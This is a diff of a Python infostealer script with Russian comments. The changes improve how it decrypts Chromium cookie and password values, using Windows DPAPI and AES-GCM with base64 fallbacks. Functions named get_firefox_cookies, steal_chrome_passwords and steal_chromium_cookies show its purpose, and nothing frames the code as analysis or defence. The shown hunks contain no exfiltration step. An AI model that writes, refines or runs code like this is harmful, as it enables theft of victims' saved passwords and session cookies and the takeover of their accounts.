@@ -140,7 +140,7 @@ def get_firefox_cookies():
     return all_cookies
 
 # =============================================
-# ОСНОВНОЙ КОД С 100% РАСШИФРОВКОЙ CHROMIUM COOKIES
+# ОСНОВНОЙ КОД С ИСПРАВЛЕННОЙ ДЕШИФРОВКОЙ
 # =============================================
 
 def create_directories():
@@ -435,47 +435,83 @@ def decrypt_chromium_value(encrypted_value, key):
         if not encrypted_value:
             return ""
         
-        # Для старых версий Chrome (DPAPI)
+        # Проверяем, зашифровано ли значение
+        if not isinstance(encrypted_value, bytes):
+            # Если это строка, просто возвращаем
+            return encrypted_value
+        
+        # Старые версии Chrome (DPAPI)
         if platform.system() == "Windows" and HAS_WIN32CRYPT:
             try:
                 decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
                 if decrypted:
-                    return decrypted.decode('utf-8', errors='ignore')
+                    try:
+                        return decrypted.decode('utf-8')
+                    except UnicodeDecodeError:
+                        return decrypted.decode('latin-1')
             except:
                 pass
         
-        # Для новых версий Chrome (AES-GCM)
-        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
-            try:
-                # Формат: vXX (1 байт) + nonce (12 байт) + зашифрованный текст + tag (16 байт)
-                nonce = encrypted_value[3:15]
-                ciphertext = encrypted_value[15:-16]
-                tag = encrypted_value[-16:]
-                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                plaintext = cipher.decrypt_and_verify(ciphertext, tag)
-                return plaintext.decode('utf-8', errors='ignore')
-            except Exception as e:
-                print(f"Ошибка расшифровки AES-GCM: {e}")
+        # Новые версии Chrome (AES-GCM)
+        if len(encrypted_value) > 3:
+            # Проверяем префиксы v10/v11
+            prefix = encrypted_value[:3]
+            if prefix in (b'v10', b'v11'):
+                try:
+                    # Формат: vXX (3 байта) + nonce (12 байт) + зашифрованный текст + tag (16 байт)
+                    nonce = encrypted_value[3:15]
+                    ciphertext = encrypted_value[15:-16]
+                    tag = encrypted_value[-16:]
+                    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+                    return plaintext.decode('utf-8')
+                except Exception as e:
+                    # Если не удалось, пробуем альтернативный формат (без тега)
+                    try:
+                        nonce = encrypted_value[3:15]
+                        ciphertext = encrypted_value[15:]
+                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                        plaintext = cipher.decrypt(ciphertext)
+                        return plaintext.decode('utf-8')
+                    except:
+                        pass
         
         # Для Linux/MacOS
         if key and len(encrypted_value) > 3:
             try:
-                # Формат: vXX (1 байт) + nonce (12 байт) + зашифрованный текст
+                # Формат: vXX (3 байта) + nonce (12 байт) + зашифрованный текст
                 nonce = encrypted_value[3:15]
                 ciphertext = encrypted_value[15:]
                 cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                 plaintext = cipher.decrypt(ciphertext)
-                return plaintext.decode('utf-8', errors='ignore')
-            except Exception as e:
-                print(f"Ошибка расшифровки AES-GCM (Linux/Mac): {e}")
+                return plaintext.decode('utf-8')
+            except:
+                pass
         
-        # Если ничего не сработало, возвращаем как есть
-        return encrypted_value.decode('utf-8', errors='ignore') if isinstance(encrypted_value, bytes) else str(encrypted_value)
+        # Если ничего не сработало, пробуем DPAPI для Windows
+        if platform.system() == "Windows" and HAS_WIN32CRYPT:
+            try:
+                decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
+                if decrypted:
+                    try:
+                        return decrypted.decode('utf-8')
+                    except UnicodeDecodeError:
+                        return decrypted.decode('latin-1')
+            except:
+                pass
+        
+        # Последняя попытка: просто декодируем как строку
+        try:
+            return encrypted_value.decode('utf-8')
+        except:
+            return base64.b64encode(encrypted_value).decode('utf-8')
             
     except Exception as e:
         print(f"Критическая ошибка дешифровки: {e}")
-    
-    return ""
+        try:
+            return base64.b64encode(encrypted_value).decode('utf-8')
+        except:
+            return "DECRYPTION_ERROR"
 
 def steal_chrome_passwords(browser_name, profile_path):
     """Крадет пароли из браузеров на основе Chromium"""
@@ -540,15 +576,11 @@ def steal_chromium_cookies(browser_name, profile_path):
             try:
                 host, name, value, path, expires, secure, encrypted_value = item
                 
-                # Приоритет 1: Расшифровать encrypted_value
+                # Всегда используем encrypted_value, если оно доступно
                 if encrypted_value and isinstance(encrypted_value, bytes):
-                    decrypted_value = decrypt_chromium_value(encrypted_value, key)
-                    cookie_value = decrypted_value
+                    cookie_value = decrypt_chromium_value(encrypted_value, key)
                 else:
-                    cookie_value = value if value else ""
-                
-                # Если получили пустую строку, пробуем value как есть
-                if not cookie_value and value:
+                    # Если нет encrypted_value, используем обычное значение
                     if isinstance(value, bytes):
                         cookie_value = value.decode('utf-8', errors='ignore')
                     else:
